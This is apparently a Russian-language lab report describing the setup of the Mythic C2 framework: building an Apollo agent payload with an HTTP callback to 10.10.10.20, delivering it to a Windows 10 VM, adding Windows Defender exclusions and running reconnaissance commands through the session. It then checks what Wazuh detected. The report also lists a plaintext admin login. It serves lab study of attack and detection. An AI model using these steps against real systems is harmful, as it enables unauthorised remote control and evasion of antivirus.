📋 Отчёт за 2026-10-14: Развёртывание Mythic C2 и первичная эксплуатация
🎯 Цель
Завершить установку Mythic C2, создать payload для Windows-агента, получить удалённый доступ к Win10 и проанализировать детекцию активности в Wazuh.

✅ Что получилось
1. Завершение установки Mythic
Вход в веб-интерфейс: https://10.10.10.20:7443

Логин: mythic_admin / пароль Minor123456789

Установлены: HTTP-профиль, агент Apollo

2. Создание payload
Агент: Apollo (v2.4.20)

C2-профиль: HTTP

Callback Host: 10.10.10.20

Callback Port: 80

Формат: .exe (WinExe)

Команды в payload: shell, download, exit, ls, ps, run, screenshot

3. Доставка и запуск
Файл перенесён на Win10 через HTTP-сервер на Kali (python3 -m http.server 8000)

Windows Defender блокировал загрузку и запуск — добавлены исключения

Payload запущен из C:\Users\Public\

4. Получение callback
В Mythic появилась активная сессия от Win10 (10.10.10.201, user vboxuser, PID 1212)

Выполнены команды:

shell whoami → win10\vboxuser

shell ipconfig → подтверждены IP-адреса

shell dir C:\Users → список пользователей

shell powershell -c "Get-Process" → список процессов, включая apollo

5. Детекция в Wazuh
Wazuh зафиксировал активность (см. ниже раздел «Что добавить в отчёт»)

ВАЖНО: в присланных логах — не детекция C2, а уязвимости Linux-ядра на агенте Ubuntu. Это не связано с запуском Apollo. Их включать в отчёт не нужно.
